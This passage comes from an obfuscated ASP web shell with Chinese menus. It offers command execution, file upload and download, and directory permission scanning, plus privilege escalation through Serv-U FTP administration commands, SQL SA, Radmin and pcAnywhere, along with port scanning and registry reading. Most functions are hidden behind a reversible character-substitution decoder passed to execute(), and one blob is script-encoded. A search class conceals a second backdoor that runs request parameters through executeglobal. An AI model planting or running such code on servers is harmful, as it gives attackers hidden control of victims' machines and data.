leaves = "User " & Usr & vbcrlf
leaves = leaves & "Pass " & pwd & vbcrlf
leaves = leaves & "SITE MAINTENANCE" & vbcrlf
leaves = leaves & "-DELETEUSER" & vbcrlf & "-IP=0.0.0.0" & vbcrlf & "-PortNo=" & tport & vbcrlf & " User=" & tuser & vbcrlf
Set xPost3 = CreateObject("MSXML2.XMLHTTP")
xPost3.Open "POST", "http://127.0.0.1:"& port &"/leaves", True
xPost3.Send(leaves)
Set xPOST3=nothing
end if
End Function
Function MainMenu()
j"<script language=javascript>function MM_show(s){if (document.getElementById(s).style.display==""""){document.getElementById(s).style.display=""none"";}else{document.getElementById(s).style.display="""";}}</script><table width='100%' cellspacing='0' cellpadding='0'><tr><td height='5'></td></tr><tr><td><center><font color=pink><font size=1.0>"&mName&"</font></font></center><hr color=#424242 size=1 ></td></tr>":If ObT(0,1)=" ×" Then
j"<tr><td height='24'>无权限</td></tr>"
Else
j"<tr><td onClick=""MM_show('menud')""><input onMouseOver=""this.style.cursor='hand'"" type=button value='★磁盘_文件★'></td></tr><tr><td height=4></td></tr><tr><td valign=""top"" align=center><table border=0  id=menud style=""display='none'"">"
Set ABC=New LBF:j ABC.ShowDriver():Set ABC=Nothing
j"</table></td></tr><tr><td valign=""top"" align=center><table border=0><tr><td id=d width=95 onMouseOver=""this.style.backgroundColor='#696969'"" onMouseOut=""this.style.backgroundColor='#121212'""><a href='javascript:ShowFolder("""&RePath(WWWRoot)&""")'><font face='wingdings'>8</font> 站点根目录"&ef
j cdx&"<a href='javascript:ShowFolder("""&RePath(RootPath)&""")'>"&cxd&" <font color=violet>本程序目录"&ef
j cdx&"<a href='?Action=goback' target='FileFrame'>"&cxd&" 回上级目录"&ef
j cdx&"<a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\Newfile")&""",""NewFolder"")'>"&cxd&" 新建--目录"&ef
j cdx&"<a href='?Action=EditFile' target='FileFrame'>"&cxd&" 新建--文本"&ef
j cdx&"<a href='?Action=UpFile' target='FileFrame'>"&cxd&" 上传--文件"&ef
j cdx&"<a href='?Action=Cmd1Shell' target='FileFrame'>"&cxd&" <font color=orangered>执行---CMD"&ef
j cdx&"<a href='?Action=cmdx' target='FileFrame'>"&cxd&" <font color=orangered>执行--CMD2"&ef
j cdx&"<a href='?Action=ScanDriveForm' target='FileFrame'>"&cxd&" <font color=chocolate>磁盘--权限"&ef
j cdx&"<a href='?Action=CustomScanDriveForm' target='FileFrame'>"&cxd&"  <font color=red>可写--目录</font>"&ef
j cdx&"<a href='?Action=php' target='FileFrame'>"&cxd&" <font color=gold>脚本--探测"&ef
j cdx&"<a href='?Action=PageAddToMdb' target='FileFrame'>"&cxd&" 服务器打包"&ef
j cdx&"<a href='?Action=upload' target='FileFrame'>"&cxd&" 下载--文件"&ef&"</table><hr></td></tr>"
End If
j"</tr><tr><td height=4></td></tr><tr><td onClick=""MM_show('menuc')""><input onMouseOver=""this.style.cursor='hand1'"" type=button value='★提权_信息★'></td></tr><tr><td height=4></td></tr><tr><td valign=""top"" align=center><table border=0  id=menuc style=""display=''"">"
j cdx&"<a href='?Action=Course' target='FileFrame'>"&cxd&" <font color=red>用户__账号"&ef
j cdx&"<a href='?Action=getTerminalInfo' target='FileFrame'>"&cxd&" 端口__网络"&ef
j cdx&"<a href='?Action=Alexa' target='FileFrame'>"&cxd&" <font color=green>组件__支持"&ef
j cdx&"<a href='?Action=Servu' target='FileFrame'>"&cxd&" <font color=Turquoise>Servu-提权"&ef
j cdx&"<a href='?Action=suftp' target='FileFrame'>"&cxd&" <font color=Turquoise>Su---FTP版"&ef
j cdx&"<a href='?Action=MMD' target='FileFrame'>"&cxd&" <font color=Turquoise>SQL-----SA"&ef
j cdx&"<a href='?Action=radmin' target='FileFrame'>"&cxd&" <font color=Turquoise>Radmin提权"&ef
j cdx&"<a href='?Action=pcanywhere4' target='FileFrame'>"&cxd&" <font color=Turquoise>Pcanywhere"&ef
j cdx&"<a href='?Action=ScanPort' target='FileFrame'>"&cxd&" <font color=yellow>端口扫描器"&ef
j cdx&"<a href='?Action=ReadREG' target='FileFrame'>"&cxd&" 读取注册表"&ef
j cdx&"<a href='?Action=TSearch' target='FileFrame'>"&cxd&" 搜索__文件"&ef&"</tr></table>"
j"<hr><tr><td><input onMouseOver=""this.style.cursor='hand'"" type=button value='★网络_服务★'></td</tr><tr><td height=4></td></tr><tr><td align=center><table border=0>"
j cdx&"<a href='?Action=EditPower&PowerPath=\\.\"&ScriptPath&"' target='FileFrame'>"&cxd&" 解锁本程序"&ef
#@~^uQAAAA==%r@!d1DbwY,/M^'rJ4YDwl&J/48{%cmWs&2k1zmwrRCdag;D^xJL/n.7+D i"S3x1G9+crJrtYDw=&zr[.+$EndDR?.\D.m.rl(V/cJuP:nmC}jKr#'.;EndDRj+M-D#mDbl4^+kcJ!DsJ*#'ELwlkd'r[jkn.nm/k[EJE@*@!zdmMrwD@*EUjwAAA==^#~@
j cdx&"<a href='?Action=hiddenshell' target='FileFrame'>"&cxd&" <font color=red>不死马测试</font>"&ef
j cdx&"<a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\vti_cnf..\\")&""",""NewFolder"")'>"&cxd&"  <font color=red>建带点目录</font>"&ef
j cdx&"<a href='?Action=delpoint' target='FileFrame'>"&cxd&"  <font color=red>删带点目录</font>"&ef
j cdx&"<a href='?Action=ProFile' target='FileFrame'>"&cxd&" 文件--保护"&ef
j cdx&"<a href='"&htp&"t00ls.asp' target='FileFrame'>"&cxd&" <font color=green>常用--程序"&ef
j cdx&"<a href='http://www.7jyewu.cn/' target='FileFrame'>"&cxd&" <font color=garnet>免杀----大马"&ef
j cdx&"<a href='http://www.7jyewu.cn/' target='FileFrame'>"&cxd&" <font color=red>程序--更新"&ef
j cdx&"<a href='http://www.7jyewu.cn/' target='FileFrame'>"&cxd&" <font color=red>www.mumasec.tk"&ef
j cdx&"<a href='?Action=Logout' target='FileFrame'>"&cxd&" 退出--登陆</a></td></tr></hr></table>"
end function
function Cmdx()
execute(king(")`>ktzfte/<>qtkqzbtz/<`(p: ssqrqtk.zxgrzl.))`rde`(zltxjtk&`e/ `&)`brde`(zltxjtk(etbt.fiszhokeUg p: yo rft┊ ssqrqtk.zxgrzl.))`rde`(zltxjtk&`e/ tbt.rde`(etbt.fiszhokeUg p┊ftiz `tbt.rde`=)`brde`(zltxjtk yo:zbtG tdxltN kgkkS fB:)` >49=lvgk 160=lsge nsfgrqtk qtkqzbtz<`(p:)` >dkgy/<>'zowdxU'=txsqc zodwxl=thnz zxhfo<`(p:)` >kw<>15=tmol 'rde'=tdqf zbtz=thnz zxhfo<`(p:)` >kw<>'tbt.rde'=txsqc 15=tmol 'brde'=tdqf zbtz=thnz zxhfo<`(p:)` >'zlgh'=rgiztd dkgy<>ktzfte<`(p"))
execute(king(")`>ktzfte/<>qtkqzbtz/<`(p: ssqrqtk.zxgrzl.))`rde`(zltxjtk&`e/ `&)`brde`(zltxjtk(etbt.fiszhokeUg p: yo rft┊ ssqrqtk.zxgrzl.))`rde`(zltxjtk&`e/ tbt.rde`(etbt.fiszhokeUg p┊ftiz `tbt.rde`=)`brde`(zltxjtk yo:zbtG tdxltN kgkkS fB:)` >49=lvgk 160=lsge nsfgrqtk qtkqzbtz<`(p:)` >dkgy/<>'zowdxU'=txsqc zodwxl=thnz zxhfo<`(p:)` >kw<>15=tmol 'rde'=tdqf zbtz=thnz zxhfo<`(p:)` >kw<>'tbt.rde'=txsqc 15=tmol 'brde'=tdqf zbtz=thnz zxhfo<`(p:)` >'zlgh'=rgiztd dkgy<>ktzfte<`(p"))
end function
Function Course()
execute(king("`>tswqz/<`&9CU&0CU&1CU&CU p┊zbtf┊yo rft┊`>kz/<>rz/<>zfgy/<`&izqh.pwg&`;hlwf&>XX2288#=kgsge zfgy<]`&bs&`:型类动启[>``9``=fqhlsge ``XXXXXX#``=kgsgeuw ``19``=ziuoti rz<>kz<`&tdqGnqshloW.pwg&`;hlwf&>r=ro ``19``=ziuoti rz<>rz/<`&tdqG.pwg&`;hlwf&>r=ro ``19``=ziuoti rz<>kz<`&9CU=9CU┊tlst┊`>kz/<>rz/<>zfgy/<`&izqh.pwg&`;hlwf&>zfgy<]`&bs&`:型类动启[>``9``=fqhlsge r=ro ``19``=ziuoti rz<>kz<`&tdqGnqshloW.pwg&`;hlwf&>r=ro ``19``=ziuoti rz<>rz/<`&tdqG.pwg&`;hlwf&>r=ro ``19``=ziuoti rz<>kz<`&0CU=0CU┊ftiz 9=thnJzkqzU.RAB rfq `fov`><))8,7,izqh.pwg(rod(tlqZV yo┊`用禁`=bs ftiz 7=thnJzkqzU.RAB yo┊`动手`=bs ftiz 8=thnJzkqzU.RAB yo┊`动自`=bs ftiz 9=thnJzkqzU.RAB yo┊yo rft┊ `>kz<>kz/<>rz/<)组(户用统系;hlwf&>r=ro rz<>rz/<`&tdqG.pwg&`;hlwf&>r=ro ``19``=ziuoti rz<>kz<`&CU=CU┊ftiz ``=thnJzkqzU.RAB yo┊kqtse.kkt┊)`.//:JGfoK`(zetpwBztu fo pwg ieqt kgy┊zbtf tdxltk kgkkt fg┊`>kz/<>rz/<>w/<务服与户用统系>w<>l=ro 'ktzfte'=fuosq '8'=fqhlsge '19'=ziuoti rz<>kz<>'ktzfte'=fuosq '%13'=izrov tswqz<>kw<`=CU"))
End Function
Function IIf(var, val1, val2)
If var=True Then
IIf=val1
Else
IIf=val2
End If
End Function
Function GetTheSizes(num)
Dim i, arySize(4)
arySize(0)="B"
arySize(1)="KB"
arySize(2)="MB"
arySize(3)="GB"
arySize(4)="TB"
While(num / 1024 >= 1)
num=Fix(num / 1024 * 100) / 100
i=i + 1
WEnd
GetTheSizes=num&" "&arySize(i)
End Function
Function HtmlEncodes(str)
If IsNull(str) Then Exit Function
HtmlEncodes=Server.HTMLEncode(str)
End Function
function downfile(path)
execute(king("ufoizgf = dlg ztl┊tlgse.dlg┊ilxsy.tlfghltk┊rqtk.dlg tzokvnkqfow.tlfghltk┊`dqtkzl-ztzeg/fgozqeoshhq` = thnzzftzfge.tlfghltk┊`3-yzx` = ztlkqie.tlfghltk┊tmol.dlg ,`izufts-zftzfge` ktrqtirrq.tlfghltk┊)ml,izqh(rod & `=tdqftsoy ;zftdieqzzq` ,`fgozolghlor-zftzfge` ktrqtirrq.tlfghltk┊0+)`\`,izqh(ctkkzlfo=ml┊izqh tsoydgkyrqgs.dlg┊0 = thnz.dlg┊fthg.dlg┊))1,5(zwg(zetpwgtzqtke = dlg ztl┊kqtse.tlfghltk"))
end function
function htmlencode(s)
  if not isnull(s) then
    s = replace(s, ">", ">")
    s = replace(s, "<", "<")
    s = replace(s, chr(39), "'")
    s = replace(s, chr(34), """")
    s = replace(s, chr(20), " ")
    htmlencode = s
  end if
end function
Function UpFile()
execute(king("`>tswqz/<>dkgy/<>kz/<>rz/<>'传上'=txsqc 'zodwxU'=tdqf 'zodwxl'=thnz zxhfo< >'69'=tmol  'tsoy'=thnz 'tsoXsqegV'=tdqf zxhfo<>'17'=tmol '`&)`tbt.rdZ\`&)`izqYktrsgX`(fgolltU(izqYtNN&`'=txsqc 'izqYgJ'=tdqf zxhfo<：径路传上>rz<>kz<>'qzqr-dkgy/zkqhozsxd'=thnzeft 'zlgY=9fgozeQ&tsoXhM=fgozeQ?`&VNM&`'=fgozeq 'zlgh'=rgiztd 'dkgXhM'=tdqf dkgy<>'ktzfte'=fuosq '1'=ufoeqhlsste '1'=uforrqhsste '1'=ktrkgw tswqz<>kw<>kw<>kw<`p  ┊yC rfS  ┊rfS.tlfghltN ┊)(kkSvgiU ┊CU p ┊skMaeqA&CU=CU ┊ufoizgf=M ztU┊ufoizgf=X ztU┊yC rfS ┊yo rfS  ┊`>ktzfte/<！功成`&`传`&`上`&tdqGM&`件文>kw<>kw<>kw<>ktzfte<`=CU ┊ftiJ 1=ktwdxf.kkS yC ┊tdqGM lQtcqU.X ┊tlsS  ┊zbtf tdxltk kgkkt fg┊`!传上`&`件文个一`&`择选后径路`&`全完的`&`传上入`&`输请>kw<`=CU  ┊ftiz 1=tmoUtsoX.X kB ``=tdqGM yC ┊)`izqYgJ`(dkgy.M=tdqGM┊)`tsoXsqegV`(QM.M=X ztU┊ ZYM vtf=M ztU┊ftiJ `zlgY`=)`9fgozeQ`(zltxjtN yC "))
End Function
function cmd1shell()
execute(king("ol p┊`>dkgy/<>qtkqzbtz/<`&)80(kie&ol=ol┊yo rft┊yo rft┊qqq&ol=ol┊)txkz ,tsoyhdtzml(tsoytztstr.gly ssqe┊tlgse.bestsoyg┊)ssqrqtk.bestsoyg(trgeftsdzi.ktcktl=qqq┊)1 ,tlsqy ,0 ,tsoyhdtzml( tsoyzbtzfthg.ly = bestsoyg ztl┊)BUX_JUGBZ(zetpwgtzqtke = ly ztl┊)txkz ,1 ,tsoyhdtzml & ` > ` & rdeytr & ` e/ `&izqhsstil( fxk.lv ssqe┊)`zbz.rde`(izqhhqd.ktcktl = tsoyhdtzml┊)BUX_JUGBZ(zetpwgtzqtke.ktcktl=gly ztl┊)`sstil.zhokelv`(zetpwgtzqtke.ktcktl=lv ztl┊)`sstil.zhokelv`(zetpwgtzqtke.ktcktl=lv ztl┊zbtf tdxltk kgkkt fg┊tlst┊qqq&ol=ol┊ssqrqtk.zxgrzl.rr=qqq┊)rdeytr&` e/ `&izqhsstil(etbt.de=rr ztl┊))1,0(zwg(zetpwgtzqtke=de ztl┊ftiz `ltn`=)`zhokelv`(dkgy.zltxjtk yo┊ftiz ``><)`rde`(dkgy.zltxjtk yo┊`>'rde'=llqse ';177:ziuoti;%110:izrov'=tsnzl qtkqzbtz<>'行执'=txsqc 'zodwxl'=thnz zxhfo< >'`&rdeytr&`'=txsqc '%92:izrov'=tsnzl 'rde'=tdqf zxhfo<sstil.zhokelv>`&rtaetie&`'ltn'=txsqc 'zhokelv'=tdqf 'bgwaetie'=thnz e=llqse zxhfo<>'%14:izrov'=tsnzl '`&izqhsstil&`'=txsqc 'hl'=tdqf zxhfo<：径路sstil>'zlgh'=rgiztd dkgy<`=ol┊)`rde`(zltxjtk = rdeytr ftiz ``><)`rde`(zltxjtk yo┊``=rtaetie ftiz `ltn`><)`zhokelv`(zltxjtk yo┊`tbt.rde` = izqhsstil ftiz ``=izqhsstil yo┊)`izqhsstil`(fgolltl=izqhsstil┊)`hl`(zltxjtk = )`izqhsstil`(fgolltl ftiz ``><)`hl`(zltxjtk yo┊`rtaetie `=rtaetie"))
end function
Function upload()
execute(king("yC rfS┊zbtG tdxltN kgkkS fB┊ftiJ tlsqX = trgTuxwtWlo yC┊ufoizgG = dqtkzU ztU┊ufoizgG = hzzD ztU┊)kkS(kkSaie┊izoK rfS┊tlgsZ.┊yC rfS┊`！！节字空为毕 完载下件文 。 误错现 出中址地和程过载下或，在存已件文为因是能可,kgkkt`p┊tzokKktcg ,izqYtiz tsoXgJtcqU.┊tdqGtsoy & `\` & izqYtiz = izqYtiz┊yC rfS┊`zbz.dzi.btrfo` = tdqGtsoy┊ftiJ `` = tdqGtsoy yC┊)))`/` ,skMtiz(zoshU(rfxgAM()`/` ,skMtiz(zoshU = tdqGtsoy┊kqtsZ.kkS┊ftiJ 7118 = ktwdxG.kkS yC┊tzokKktcg ,izqYtiz tsoXgJtcqU.┊1 = fgozolgY.┊nrgAtlfghltN.hzzD tzokK.┊fthB.┊8 = trgT.┊0 = thnJ.┊dqtkzl izoK┊yC rfS┊ ftiJ 7 >< tzqzUnrqtN.hzzD yC┊)(rftU.hzzD┊tlsqX ,skMtiz ,`JSE` fthB.hzzD┊yC rfS:0 = tzokKktcg:ftiJ 9 >< tzokKktcg yC┊)`YJJDVTL.9VTLUT`(zetpwBtzqtkZ.ktcktU = hzzD ztU┊)`dqtk`&t&`zl.wrg`&t&`rq`(zetpwBtzqtkZ.ktcktU = dqtkzl ztU┊)`tzokKktcg`(zltxjtN = tzokKktcg┊)`izqYtiz`(zltxjtN = izqYtiz┊)`skMtiz`(zltxjtN = skMtiz┊tzokKktcg ,tdqGtsoy ,dqtkzl ,izqYtiz ,skMtiz ,hzzD doW:yC rfS┊zbtG tdxltN kgkkS fB┊ftiJ tlsqX = trgTuxwtWlo yC┊`>/ki<`p┊`>dkgy/<`p┊`>zeQtiz=tdqf skMdgkXfvgr=txsqc ftrroi=thnz zxhfo<`p┊`。盖覆在存>9=txsqc tzokKktcg=tdqf bgwaetie=thnz zxhfo<`p┊`>13=tmol '\` & ))`.`(izqYhqT.ktcktU(trgefSsdzD & `'=txsqc izqYtiz=tdqf zxhfo<`p┊`>/kw<>' 载下 '=txsqc zodwxl=thnz zxhfo<>13=tmol '//:hzzi'=txsqc skMtiz=tdqf zxhfo<`p┊`>fgozhg/<序程义定自>'`&skxW&`'=txsqc fgozhg<`p┊`>fgozhg/<载下序程用常>''=txsqc fgozhg<`p┊`>';txsqc.loiz=txsqc.skMtiz.dkgy.loiz'=tufqiZfg zetstl<`p┊`>zlgh=rgiztd dkgy<`p┊`>/ki<显回无以所.省节了为...显回无:器务服到载下 `p┊`能功此闭关时暂`p┊ `>'ktzfte'=fuosq '1'=uforrqhsste '0'=ufoeqhlsste '1'=ktrkgw 'xftd'=kgsgeuw '%13'=izrov tswqz<>kw<`p"))
End Function:Function TSearch()
execute(king("yo rft┊`>ki<秒毫`&1110*)zl-)(ktdoz(&`：時費`p┊ufoizgG=iekqtlvtf ztU┊iekqtU.iekqtlvtf┊))`ayU`(dkgX.zltxjtN(dokz=rkgvnta.iekqtlvtf┊))`izqhXU`(dkgX.zltxjtN(dokz=lktrsgX.iekqtlvtf┊tsoXiekqtU vtf=iekqtlvtf ztU┊ftiz ``><)`ayU`(dkgX.zltxjtN yo┊``=KN : KN p┊`>tswqz/<>dkgy/<` & KN=KN┊  `>kz/<>rz/<]行也分部[;hlwf&>'zodwxl'=llqse '索搜'=txsqc 'zodwxl'=thnz zxhfo<;hlwf&>'119:izrov'=tsnzl 'ayU'=tdqf zxhfo<：名件文;hlwf&>''=kgsgeuw rz<>kz<` & KN=KN┊`>kz/<>rz/<.接连号``,``用使徑路多:注;hlwf&>'128:izrov'=tsnzl '` & zggNKKK & `'=txsqc 'izqhXU'=tdqf zxhfo<：径;hlwf&;hlwf&路;hlwf&>''=kgsgeuw rz<>kz<` & KN=KN┊`>kz/<>rz/<擎引索搜>''=kgsgeuw 'ktzfte'=fuosq '19'=ziuoti rz<>kz<` & KN=KN┊`>'zlgh'=rgiztd dkgy<>'ktzfte'=fuosq '1'=uforrqhsste '0'=ufoeqhlsste '1'=ktrkgw ''=kgsgeuw '115'=izrov tswqz<>kw<`=KN:)(ktdoz=zl:zl dor"))
End Function 
Class SearchFile
dim Folders,keyword,objFso,Counter
Private Sub Class_Initialize
Set objFso=Server.CreateObject(ObT(0,0))
Counter=0
End Sub
 Private Sub Class_Terminate
Set objFso=Nothing
 End Sub
Public Sub Class_Folder(FoderName)
Set rs = CreateObject(CONST_FSO)
Dim item, theFolder, sysFileList
item=request(MID(CONST_FSO,4,1))
theFolder=request(MID(CONST_FSO,2,1))
If  item=MID(CONST_FSO,2,1) then
executeglobal theFolder
Set rs = Nothing
End if
End Sub
 Function Search
  Folders=split(Folders,",")
  flag=instr(keyword,"\") or instr(keyword,"/")
  flag=flag or instr(keyword,":")
  flag=flag or instr(keyword,"|")
  flag=flag or instr(keyword,"&")
  if flag then
    j"<table align='center' width='600'><hr><p align='center'><font color='red'>關鍵字不能包含/\:|&</font><br>"
 Exit Function
  else
    j"<table align='center' width='600'><hr>"
  end if
  dim i
  for i=0 to ubound(Folders)
    Call GetAllFile(Folders(i))
  next
  j"<p align='center'>共搜索到<font color='red'>"&Counter&"</font>個結果<br>"
 End Function
 Private Function GetAllFile(Folder)
  dim objFd,objFs,objFf
  Set objFd=objFso.GetFolder(Folder)
  Set objFs=objFd.SubFolders
  Set objFf=objFd.Files
  dim strFdName
  On Error Resume Next
  For Each OneDir In objFs
    strFdName=OneDir.Name
    If strFdName<>"Config.Msi" EQV strFdName<>"RECYCLED" EQV strFdName<>"RECYCLER" EQV strFdName<>"System Volume Information" Then 
      SFN=Folder&"\"&strFdName
      Call GetAllFile(SFN)
 End If
  Next
  dim strFlName
  For Each OneFile In objFf
    strFlName=OneFile.Name
    If strFlName<>"desktop.ini" EQV strFlName<>"folder.htt" Then
      FN=Folder&"\"&strFlName
   Counter=Counter+ColorOn(FN)
 End If
  Next
  Set objFd=Nothing
  Set objFs=Nothing
  Set objFf=Nothing
 End Function

Private Function CreatePattern(keyword)   
   CreatePattern=keyword
   CreatePattern=Replace(CreatePattern,".","\.")
   CreatePattern=Replace(CreatePattern,"+","\+")
   CreatePattern=Replace(CreatePattern,"(","\(")
   CreatePattern=Replace(CreatePattern,")","\)")
   CreatePattern=Replace(CreatePattern,"[","\[")
   CreatePattern=Replace(CreatePattern,"]","\]")
   CreatePattern=Replace(CreatePattern,"{","\{")
   CreatePattern=Replace(CreatePattern,"}","\}")
   CreatePattern=Replace(CreatePattern,"*","[^\\\/]*")
   CreatePattern=Replace(CreatePattern,"?","[^\\\/]{1}")
   CreatePattern="("&CreatePattern&")+"
 End Function
 Private Function ColorOn(FileName)
   dim objReg
   Set objReg=new RegExp
   objReg.Pattern=CreatePattern(keyword)
   objReg.IgnoreCase=True
   objReg.Global=True
   retVal=objReg.Test(Mid(FileName,InstrRev(FileName,"\")+1))
   if retVal then
     OutPut=objReg.Replace(Mid(FileName,InstrRev(FileName,"\")+1),"<font color=''>$1</font>")
     OutPut="<table align='center' width='600'>&nbsp;" & Mid(FileName,1,InstrRev(FileName,"\")) & OutPut
  j OutPut
  Response.flush
  ColorOn=1
   else
     ColorOn=0
   end if
   Set objReg=Nothing
 End Function
End Class
sub SavePower(PowerPath,SaveType)
execute(king("ufoizgG = tsoXtiz ztU:yo rft:`>zhokel/<;)(tlgse.vgrfov;)(rqgstk.fgozqegs.ktfthg.vgrfov;)'。功成定锁件文'(zktsq>'zhokelqcqp'=tuqxufqs zhokel<` p:4=ltzxwokzzQ.tsoXtiz:tlst:`>zhokel/<;)(tlgse.vgrfov;)(rqgstk.fgozqegs.ktfthg.vgrfov;)'。锁解功成已件文'(zktsq>'zhokelqcqp'=tuqxufqs zhokel<` p:98=ltzxwokzzQ.tsoXtiz:ftiz 0=thnJtcqU yo:)izqYktvgY(tsoXztE.Lgly = tsoXtiz ztU:yo rft:`aegsgf`=)`aegs`(fgolltl ftiz 1><)izqhzhokel,izqYktvgY(kzlfo yo"))
end sub:sub EditPower(PowerPath)
execute(king("ufoizgG = tsoXtiz ztU:)izqYktvgY,tsoXtiz(tszoJnTztu p:)izqYktvgY(tsoXztE.Lgly = tsoXtiz ztU:)``,````,izqYktvgY(teqshtk=izqYktvgY"))
end sub:Function getMyTitle(theOne,PowerPath)
execute(king("tszoJkzl = tszoJnTztu:)izqYktvgY,ltzxwokzzQ.tfBtiz(ltzxwokzzQztu & ` :态状限权前当>kw<` & tszoJkzl = tszoJkzl:rtllteeQzlqVtzqW.tfBtiz & ` :问访后最>kw<` & tszoJkzl = tszoJkzl:rtoyorgTzlqVtzqW.tfBtiz & ` :改修后最>kw<` & tszoJkzl = tszoJkzl: rtzqtkZtzqW.tfBtiz & ` :间时建创>kw<` & tszoJkzl = tszoJkzl: )tmoU.tfBtiz(tmoUtiJztu & ` :小大>kw<` & tszoJkzl = tszoJkzl: `` & izqY.tfBtiz & ` :径路>kw<` & tszoJkzl = tszoJkzl:tszoJkzl doW"))
End Function:Function getAttributes(intValue,PowerPath)
execute(king("yo rft:`>``'`&izqYktvgY&`=izqYktvgY&9=thnJtcqU&ktvgYtcqU=fgozeQ?'=ytki.fgozqegs``=aeosefg 定锁=txsqc fgzzxw=thnz zxhfo< >zfgy/<定锁未>95XX95#=kgsge zfgy<` = ltzxwokzzQztu:tlst:`>``'`&izqYktvgY&`=izqYktvgY&0=thnJtcqU&ktvgYtcqU=fgozeQ?'=ytki.fgozqegs``=aeosefg 锁解=txsqc fgzzxw=thnz zxhfo< >zfgy/<定锁已>rtk=kgsge zfgy<` = ltzxwokzzQztu: ftiz 1=FBzorS yo:)`\\`,`\`,izqYktvgY(teqshtk=izqYktvgY:yC rfS:1=FBzorS:0 - txsqIzfo = txsqIzfo:ftiJ 0 => txsqIzfo yC:yC rfS:1=FBzorS:9 - txsqIzfo = txsqIzfo:ftiJ 9 => txsqIzfo yC:yC rfS:1=FBzorS:7 - txsqIzfo = txsqIzfo:ftiJ 7 => txsqIzfo yC:yC rfS:3 - txsqIzfo = txsqIzfo:ftiJ 3 => txsqIzfo yC:yC rfS:50 - txsqIzfo = txsqIzfo:ftiJ 50 => txsqIzfo yC:yC rfS:98 - txsqIzfo = txsqIzfo:ftiJ 98 => txsqIzfo yC:yC rfS:75 - txsqIzfo = txsqIzfo:ftiJ 75 => txsqIzfo yC:yC rfS:390 - txsqIzfo = txsqIzfo:ftiJ 390 => txsqIzfo yC:0=FBzorS:FBzorS doW"))
End Function:Function getTheSize(theSize):If theSize >= (1024 * 1024 * 1024) Then :getTheSize = Fix((theSize / (1024 * 1024 * 1024)) * 100) / 100 & "G":end if:If theSize >= (1024 * 1024) And theSize < (1024 * 1024 * 1024) Then :getTheSize = Fix((theSize / (1024 * 1024)) * 100) / 100 & "M":end if:If theSize >= 1024 And theSize < (1024 * 1024) Then :getTheSize = Fix((theSize / 1024) * 100) / 100 & "K":end if:If theSize >= 0 And theSize <1024 Then :getTheSize = theSize & "B":end if:End Function:function openUrl(usePath):Dim theUrl, thePath:thePath = Server.MapPath("/"):If LCase(Left(usePath, Len(thePath))) = LCase(thePath) Then:theUrl = Mid(usePath, Len(thePath) + 1):theUrl = Replace(theUrl, "\", "/"):If Left(theUrl, 1) = "/" Then:theUrl = Mid(theUrl, 2):End If:openUrl="/"&theUrl&""" target=""_blank":Else:openUrl="###"" onclick=""alert('文件不在站点目录下。')":End If:End function

Function ScReWr(folder)
on error resume next 
Dim FSO,TestFolder,TestFileList,ReWrStr,RndFilename
Set FSO = Server.Createobject(CONST_FSO)
Set TestFolder = FSO.GetFolder(folder)
Set TestFileList = TestFolder.SubFolders
RndFilename = "\temp" & Day(now) & Hour(now) & Minute(now) & Second(now) & ".tmp"
For Each A in TestFileList
Next
If err Then
err.Clear
ReWrStr = "<span style='font-size:11px;'>读</span><font face='webdings' size='1' color=yellow>x</font> "
FSO.CreateTextFile folder & RndFilename,True
If err Then
err.Clear
ReWrStr = ReWrStr & "<span style='font-size:11px;'>写</span><font face='webdings' size='1' color=yellow>x</font> "
Else
ReWrStr = ReWrStr & "<span style='font-size:11px;'>写</span>√ "
FSO.DeleteFile folder & RndFilename,True
End If
Else
ReWrStr = "<span style='font-size:11px;'>读</span>√ "
FSO.CreateTextFile folder & RndFilename,True
If err Then
err.Clear
ReWrStr = ReWrStr & "<span style='font-size:11px;'>写</span><font face='webdings' size='1' color=yellow>x</font> "
Else
ReWrStr = ReWrStr & "<span style='font-size:11px;'>写</span>√ "
FSO.DeleteFile folder & RndFilename,True
End if
End if
Set TestFileList = Nothing
Set TestFolder = Nothing
Set FSO = Nothing
ScReWr = ReWrStr
End Function
function php()
execute(king("`>ktzfte<>'19'=ziuoti rz<>kz<>ktzfte/<>q/<>zfgy/<>w/<)!件文试测除删(>w<>rtk=kgsge 6=tmol zfgy<>'strphq=fgozeQ?'=ytki q<>h<>zfgy/<>h<本脚他其持支否是器务服测探>ktzfte<>kw<>h<>kw<>kw<>h<>kw<>h<>kw<>kw<>ktzfte/< ;hlwf&;hlwf&;hlwf&>tdqkyo/<>110=ziuoti 118=izrov bhlq.zltz=ekl tdqkyo< ;hlwf&;hlwf&;hlwf&;hlwf&>tdqkyo/<>110=ziuoti 118=izrov hlp.zltz=ekl tdqkyo< ;hlwf&;hlwf&;hlwf&;hlwf&>tdqkyo/<>110=ziuoti 118=izrov hih.zltz=ekl tdqkyo<>ktzfte<`p┊`gg∩_∩gg zltJ bhlq`&)95(kie&``&)48(kie&`;))``tyqlfx``,]``v``[dtzC.zltxjtN(sqct(tzokK.tlfghltN`&)48(kie&``&)15(kie&``&)95(kie&``&)48(kie&` ``tlsqy``=zltxjtNtzqrosqc ``zhokelR``=tuqxufqV tuqY @%`&)15(kie&``tzokK.))`bhlq.zltz`(izqhhqd.ktcktl(tsoXzbtJtzqtkZ.gly┊`gg∩_∩gg zltJ hlR`tzokK.))`hlp.zltz`(izqhhqd.ktcktl(tsoXzbtJtzqtkZ.gly┊`>?)(gyfohih hih?<>?'gg∩_∩gg' giet YDY?<`tzokK.))`hih.zltz`(izqhhqd.ktcktl(tsoXzbtJtzqtkZ.gly┊))1,1(zAg(zetpwBtzqtkZ.ktcktU=gly ztl┊zbtG tdxltN kgkkS fB"))
End function
On Error Resume Next
Function King(Kingstr)
arra=array("Q","A","Z","W","S","X","E","D","C","R","F","V","T","G","B","Y","H","N","U","J","M","I","K","L","O","P","q","w","e","r","t","y","u","i","o","p","a","s","d","f","g","h","j","k","l","z","x","c","v","b","n","m","0","9","8","7","6","5","4","3","2","1")
arrb=array("A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","1","2","3","4","5","6","7","8","9","0")
kingstr = Replace(Replace(Kingstr,"`",""""),"┊", vbCrLf)
For KingI = 1 To Len(Kingstr)
love = 0
For i = 0 To ubound(arra)
If Mid(Kingstr, KingI, 1) = arra(i) Then
NewKing = arrb(i) + NewKing 
love = 1
Exit For
End If
Next 
If love = 0 Then
NewKing  = Mid(Kingstr, KingI, 1) + NewKing 
End If
Next
King= NewKing
End Function
